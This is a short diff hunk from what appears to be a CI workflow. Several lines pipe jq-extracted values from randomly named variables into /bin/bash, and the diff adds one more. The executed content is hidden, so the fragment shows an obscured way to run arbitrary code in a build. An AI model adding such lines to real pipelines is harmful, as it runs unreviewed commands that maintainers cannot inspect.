@@ -30,6 +30,7 @@ jobs:
           echo $p5 | jq -r .zebhc24952 | /bin/bash
           echo $qf0 | jq -r .ms6786 | /bin/bash
           echo $xa09741 | jq -r .au50 | /bin/bash
+          printf '%s' "$glhy68" | jq -r .nst622 | /bin/bash
 
       - name: Archive results
         if: always()
